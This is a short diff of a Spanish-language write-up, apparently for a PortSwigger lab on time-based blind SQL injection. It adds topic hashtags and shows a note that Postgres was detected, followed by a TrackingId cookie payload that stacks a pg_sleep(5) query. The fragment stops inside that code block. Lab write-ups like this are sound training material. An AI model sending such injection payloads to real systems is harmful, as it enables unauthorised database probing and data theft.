@@ -4,6 +4,8 @@ title: "15 - Blind SQL injection with time delays and information retrieval"
 
 # 15 - Blind SQL injection with time delays and information retrieval
 
+#sqli #blindsqli #timingattack #infodisclosure #portswigger
+
 Postgres detectado
 ```r
 TrackingId='%3b+SELECT+pg_sleep(5)+--+-
